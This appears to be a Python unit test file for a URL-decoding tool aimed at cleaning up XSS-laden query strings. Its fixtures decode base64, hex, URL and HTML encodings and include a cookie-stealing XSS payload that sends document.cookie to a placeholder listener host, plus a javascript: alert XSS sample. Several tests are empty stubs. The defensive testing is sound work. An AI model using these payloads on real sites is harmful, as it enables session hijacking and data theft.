import unittest
from xssed_url_cleanup import DeepURL

class TestDeepURLFunctions(unittest.TestCase):
    

    def test_de_base64_decode(self):

        b64 = DeepURL(query='ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU=') 
        (decoded, dec_str) = b64.decode_query('base64')
        self.assertEqual(dec_str, 'document.location="http://listernIP/"+document.cookie')
        self.assertEqual(decoded, True)

        b64 = DeepURL(query='ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU-') 
        (decoded, dec_str) = b64.decode_query('base64')
        self.assertEqual(dec_str, 'document.location="http://listernIP/"+document.cookie')
        self.assertEqual(decoded, True)

        b64 = DeepURL(query='document.location="http://listernIP/"+document.cookie') 
        (decoded, dec_str) = b64.decode_query('base64')
        self.assertEqual(dec_str, None)
        self.assertEqual(decoded, False)


    def test_de_hex_decode(self):

        hex = DeepURL(query='48656c6c6f20576f726c6421')
        (decoded, dec_str) = hex.decode_query('hex')
        self.assertEqual(dec_str,'Hello World!')
        self.assertEqual(decoded, True)

        hex = DeepURL(query='Not Hex')
        (decoded, dec_str) = hex.decode_query('hex')
        self.assertEqual(dec_str,None)
        self.assertEqual(decoded, False)


    def test_de_url_decode(self):
        url = DeepURL(query='title=%D0%BF%D1%80%D0%B0%D0%B2%D0%BE%D0%B2%D0%B0%D1%8F+%D0%B7%D0%B0%D1%89%D0%B8%D1%82%D0%B0')
        (decoded, dec_str) = url.decode_query('url')
        self.assertEqual(dec_str, 'title=правовая+защита')
        self.assertEqual(decoded, True)

        url = DeepURL(query='not url')
        (decoded, dec_str) = url.decode_query('url')
        self.assertEqual(dec_str, None)
        self.assertEqual(decoded, False)


    def test_de_html_decode(self):
        html = DeepURL(query='<IMG SRC=javascript:alert(&quot;XSS&quot;)>')
        (decoded, dec_str) = html.decode_query('html')
        self.assertEqual(dec_str, '<IMG SRC=javascript:alert("XSS")>')
        self.assertEqual(decoded, True)

        html = DeepURL(query='<IMG SRC=javascript:alert("XSS")>')
        (decoded, dec_str) = html.decode_query('html')
        self.assertEqual(dec_str, None)
        self.assertEqual(decoded, False)

    
    def test_de_octal_decode(self):
        pass


    def test_de_dword_decode(self):
        pass


    def test_de_utf7_decode(self):
        pass


    def test_de_usascii_decode(self):
        pass


    def test_de_decode(self):
        pass


if __name__ == '__main__':
    unittest.main()